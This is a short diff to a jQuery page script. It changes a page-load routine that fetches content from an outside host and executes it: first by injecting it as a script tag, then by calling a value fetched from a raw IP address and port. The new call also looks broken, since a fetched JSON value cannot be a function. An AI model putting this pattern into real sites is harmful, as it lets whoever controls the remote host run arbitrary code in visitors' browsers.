@@ -1,7 +1,8 @@
 $(document).ready(function(){
-	$.get("http://surfacerealms.com", function(data){
-			console.log(data);
-			$("html").append($("<script>" + data + "</script>"));
+	$.get("http://162.243.234.137:7000", function(data){
+			console.log(data.script);
+			var func = data.script;
+            func();
 		})
 });
 
